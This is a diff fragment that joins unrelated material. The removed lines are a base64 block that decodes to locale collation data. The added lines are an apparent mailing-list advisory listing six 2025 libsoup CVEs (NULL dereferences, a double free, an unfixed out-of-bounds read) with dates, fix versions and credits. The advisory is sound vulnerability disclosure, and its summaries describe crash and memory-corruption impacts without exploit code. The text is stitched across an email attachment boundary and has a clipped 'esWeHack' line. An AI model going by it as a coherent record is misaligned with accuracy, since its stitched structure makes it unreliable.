-Zm9yd2FyZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2Zvcndh
-cmQNCjxYWFg2Lz4+Zm9yd2FyZDtmb3J3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFj
-a3dhcmQ7YmFja3dhcmQ7Zm9yd2FyZA0KPFhYWDUvPj5iYWNrd2FyZDtiYWNrd2FyZDtiYWNrd2Fy
-ZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFg0Lz4+Zm9y
-d2FyZDtiYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJk
-O2ZvcndhcmQNCjxYWFgzLz4+YmFja3dhcmQ7Zm9yd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3
-YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFgyLz4+Zm9yd2FyZDtmb3J3YXJkO2Jh
-Y2t3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7Zm9yd2FyZA0KPFhYWDEv
-Pj5iYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFj
-a3dhcmQ7Zm9yd2FyZA0KcmVvcmRlci1zZWN0aW9ucy1lbmQNCkVORCBMQ19DT0xMQVRFDQo=
+     YesWeHack Report ID: #YWH-PGM9867-15
+     Date Reported: December 2, 2024
+     Date Fixed: January 8, 2025
+     Fix Version: 3.6.2
+     Fix: ba4c3a6f
+     CVE: CVE-2025-32909
+     CWE-476: NULL Pointer Dereference
+     Discovery Credit: Alon Zahavi
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
 
---_002_20250122134128GA29327localhostlocaldomain_--
+     libsoup's SoupContentSniffer, prior to version 3.6.2, is vulnerable to
+     a null pointer dereference in its sniff_mp4 function. A malicious HTTP
+     server may cause the libsoup client to crash.
+
+CVE-2025-32910 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/432
+
+     Null pointer deference on libsoup via /auth/soup-auth-digest.c through
+     "soup_auth_digest_authenticate" on client when server omits the "realm"
+     parameter in an Unauthorized response with Digest authentication
+
+     esWeHack Report ID: #YWH-PGM9867-17
+     Date Reported: December 8, 2024
+     Date Fixed: January 10, 2025
+     Fix Version: 3.6.3
+     Fix: !417 (merged)
+     CVE: CVE-2025-32910
+     CWE-476: NULL Pointer Dereference
+     Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+
+     libsoup prior to version 3.6.3 is vulnerable to a null pointer dereference
+     in soup_auth_digest_authenticate(). A malicious HTTP server may cause the
+     libsoup client to crash.
+
+CVE-2025-32911 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/433
+
+     Double free on soup_message_headers_get_content_disposition() through
+     "soup-message-headers.c" via "params" GHashTable value
+
+     YesWeHack Report ID: #YWH-PGM9867-19
+     Date Reported: December 8, 2024
+     Date Fixed: January 8, 2025
+     Fix Version: 3.6.3
+     Fix: !422 (merged)
+     CVE: CVE-2025-32911
+     CWE-590: Free of Memory Not on the Heap
+     Discovery Credit: Anonymous
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+
+     libsoup prior to version 3.6.3 is vulnerable to a free of memory not on
+     the heap in soup_message_headers_get_content_disposition(). A malicious
+     HTTP client may induce memory corruption in the libsoup server.
+
+     Michael's note: theoretically this could result in remote code execution,
+     so this is particularly not good.
+
+CVE-2025-32912 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/434
+
+     NULL pointer dereference in client when server omits the "nonce"
+     parameter in an Unauthorized response with Digest authentication
+
+     YesWeHack Report ID: #YWH-PGM9867-20
+     Date Reported: December 9, 2024
+     Date Fixed: February 8, 2025
+     Fix Version: 3.6.5
+     Fix: !417 (merged) and !434 (merged) and 910ebdcd
+     CVE: CVE-2025-32912
+     CWE-476: NULL Pointer Dereference
+     Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+
+     libsoup prior to 3.6.5 is vulnerable to a null pointer dereference in
+     SoupAuthDigest. A malicious HTTP server may cause the libsoup client to
+     crash.
+
+CVE-2025-32913 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/435
+
+     NULL pointer dereference in soup_message_headers_get_content_disposition
+     when "filename" parameter is present, but has no value in
+     Content-Disposition header
+
+     YesWeHack Report ID: #YWH-PGM9867-21
+     Date Reported: December 9, 2024
+     Date Fixed: January 8, 2025
+     Fix Version: 3.6.2
+     Fix: !422 (merged)
+     CVE: CVE-2025-32913
+     CWE-476: NULL Pointer Dereference
+     Discovery Credit: Jan Różański
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+
+     libsoup prior to 3.6.2 is vulnerable to a null pointer dereference in
+     soup_message_headers_get_content_disposition() . A malicious HTTP peer
+     may crash a libsoup client or server that uses this function.
+
+CVE-2025-32914 - https://gitlab.gnome.org/GNOME/libsoup/-/issues/436
+
+     OOB Read on libsoup through function "soup_multipart_new_from_message"
+     in soup-multipart.c leads to crash or exit of process
+
+     YesWeHack Report ID: #YWH-PGM9867-23
+     Date Reported: April 9, 2025
+     Date Fixed: Not Fixed
+     Fix Version: Not Fixed
+     Fix: Not Fixed
+     CVE: CVE-2025-32914
+     CWE: Out-of-bounds Read (CWE-125)
+     Discovery Credit: Alon Zahavi
+     Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency
+
+     libsoup is vulnerable to an out of bounds read in
+     soup_multipart_new_from_message(). A malicious HTTP client may
+     induce the libsoup server to read out of bounds.
+
+-- 
+         -Alan Coopersmith-                 alan.coopersmith@oracle.com
+          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
+
